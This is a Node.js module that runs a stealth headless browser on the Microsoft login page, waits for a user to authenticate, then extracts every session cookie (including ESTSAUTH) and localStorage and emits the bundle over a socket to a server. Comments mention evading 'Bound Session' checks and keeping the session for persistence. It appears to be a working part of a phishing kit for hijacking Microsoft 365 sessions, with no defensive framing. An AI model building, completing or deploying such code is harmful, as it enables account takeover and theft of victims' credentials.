const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-features=IsolateOrigins,site-per-process'
        ]
    });

    try {
        const page = await browser.newPage();
        
        // Match a standard Desktop User-Agent to avoid 'Bound Session' flags
        const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
        await page.setUserAgent(UA);

        console.log("Navigating to Microsoft...");
        await page.goto('https://login.microsoftonline.com', { 
            waitUntil: 'networkidle2',
            timeout: 60000 
        });

        console.log("Waiting for session stabilization (120s max)...");
        
        // FIX: Broaden the wait condition to prevent TimeoutError
        await page.waitForFunction(() => {
            const hasAuthCookie = document.cookie.includes('RPSSecAuth') || document.cookie.includes('ESTSAUTH');
            const isAtDashboard = window.location.href.includes('outlook.office.com') || window.location.href.includes('portal.office.com');
            const hasSearchBox = !!document.querySelector('#top_panel_search_input');
            
            return hasAuthCookie || isAtDashboard || hasSearchBox;
        }, { timeout: 120000 });

        // Extract using CDP to get cross-domain cookies (Required for persistence)
        const client = await page.target().createCDPSession();
        const { cookies } = await client.send('Network.getAllCookies');
        const localStorageData = await page.evaluate(() => JSON.stringify(localStorage));

        const sessionBundle = {
            cookies,
            localStorage: JSON.parse(localStorageData),
            userAgent: UA,
            capturedAt: new Date().toISOString()
        };

        console.log("Session Bundle generated.");
        socket.emit('session_data', sessionBundle);

    } catch (error) {
        console.error("Orchestra Error:", error.message);
        socket.emit('session_error', error.message);
        throw error; // Let server.js log the stack trace
    } finally {
        await browser.close();
    }
}

// CRITICAL: Must match the name used in require() in server.js
module.exports = { startSession };
